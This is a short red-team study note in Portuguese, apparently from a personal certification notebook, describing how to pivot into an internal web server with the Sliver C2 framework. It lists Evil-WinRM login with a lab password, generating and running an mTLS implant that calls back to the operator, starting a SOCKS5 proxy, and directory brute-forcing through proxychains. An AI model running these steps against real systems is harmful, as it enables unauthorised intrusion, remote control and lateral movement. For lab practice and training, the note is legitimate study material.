> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/sliver-c2/pivoting-and-persistence/pivoting.md).

# Pivoting

**Objetivo**

Acessar um **servidor web interno** (não exposto) usando uma máquina comprometida como **pivot**.

**Acesso inicial (Pivot host)**

```
evil-winrm -u alice.wonderland -p 'HackSmarter123' -i <TARGET_IP>
```

**Validar acesso interno**

```
curl http://<WEB_SERVER_IP>
```

Confirma:

* O servidor interno é acessível **a partir do host comprometido**

**Gerar e executar implant**

```
generate --mtls <SEU_IP>:443 --os windows
```

* Upload para o alvo
* Executar `.exe`
* Nova sessão no Sliver

**Iniciar proxy SOCKS5**

```
use <SESSION_ID>
socks5 start
```

&#x20;Resultado:

* Proxy ativo em `127.0.0.1:1081`

**Configurar navegador (FoxyProxy)**

Configuração:

* Tipo: **SOCKS5**
* Host: `127.0.0.1`
* Porta: `1081`

Ativar proxy no navegador

**Descoberta de diretórios**

```
proxychains -q dirsearch -u http://<WEB_SERVER_IP>
```

Resultado:

* Descoberta de:

```
http://<WEB_SERVER_IP>/login.html
```

**Acessar aplicação interna**

No navegador (com proxy ativo):

```
http://<WEB_SERVER_IP>/login.html
```
